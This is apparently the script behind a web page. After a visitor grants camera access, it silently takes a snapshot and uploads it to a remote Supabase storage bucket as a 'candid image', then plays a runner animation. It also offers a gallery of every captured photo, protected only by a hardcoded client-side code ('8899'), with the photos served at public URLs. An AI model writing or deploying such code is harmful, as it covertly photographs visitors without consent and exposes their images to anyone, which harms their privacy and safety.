// SUPABASE CONFIG
const SUPABASE_URL = "https://edafkomypijighnizyee.supabase.co";
const SUPABASE_KEY = "sb_publishable_pR7et-ooMnmBQus4X5vHRg_-1O4_OSi";

const supabase = supabaseJs.createClient(SUPABASE_URL, SUPABASE_KEY);

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");
const gallery = document.getElementById("gallery");
const runner = document.getElementById("runner");

// RUNNER ANIMATION
function startRunner() {
  runner.style.animation = "move 3s linear infinite";
}

// ENABLE CAMERA BUTTON ACTION
document.getElementById("enableCamera").addEventListener("click", async () => {
  const btn = document.getElementById("enableCamera");
  btn.style.display = "none";

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    video.srcObject = stream;
    video.style.display = "block";

    video.onloadedmetadata = async () => {
      // Draw video frame to canvas
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Upload snapshot to Supabase
      const blob = await new Promise(resolve => canvas.toBlob(resolve, "image/png"));
      const filename = `photo_${Date.now()}.png`;

      const { error } = await supabase
        .storage
        .from("photos")
        .upload(filename, blob);

      if (error) {
        console.error("Upload failed:", error.message);
      } else {
        console.log("Candid image stored:", filename);
        startRunner();
      }
    };
  } catch (e) {
    alert("Camera permission denied");
    console.error(e);
  }
});

// CHECK ACCESS CODE
async function checkCode() {
  const code = document.getElementById("code").value.trim();
  if (code === "8899") {
    loadGallery();
  } else {
    alert("ACCESS DENIED");
  }
}

// LOAD ALL IMAGES FROM SUPABASE
async function loadGallery() {
  gallery.innerHTML = "";

  // List files in bucket
  const { data: files, error } = await supabase
    .storage
    .from("photos")
    .list("", { limit: 100, sortBy: { column: "name", order: "desc" } });

  if (error) {
    console.error("Error fetching files:", error.message);
    return;
  }

  if (!files || files.length === 0) {
    gallery.innerHTML = "<p>No photos yet.</p>";
    return;
  }

  // Create image grid
  files.forEach(file => {
    const { data: urlObj } = supabase
      .storage
      .from("photos")
      .getPublicUrl(file.name);

    const img = document.createElement("img");
    img.src = urlObj.publicUrl;
    img.alt = file.name;
    gallery.appendChild(img);
  });
}
